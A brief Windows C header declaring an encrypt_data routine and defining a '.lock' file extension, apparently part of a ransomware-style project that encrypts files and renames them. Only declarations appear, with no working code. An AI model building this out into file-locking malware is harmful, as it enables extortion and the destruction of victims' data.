#ifndef H_ENCRYPT
#define H_ENCRYPT

#include <windows.h>
#include "stack.h"

#define EXT L".lock"

void encrypt_data(LPCVOID p_src, LPVOID p_dest, DWORD file_size);
#endif